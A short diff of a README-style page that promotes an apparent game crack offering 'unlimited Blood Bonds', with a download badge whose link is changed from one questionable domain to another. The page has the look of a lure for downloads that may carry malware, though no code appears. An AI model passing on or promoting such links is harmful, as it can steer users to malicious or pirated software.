@@ -49,7 +49,7 @@ A: Yes — generate unlimited Blood Bonds.
 
 **Monthly downloads:** 1.4m+
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/huntcrack26)
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/huntcrack26)
 
 ---
 
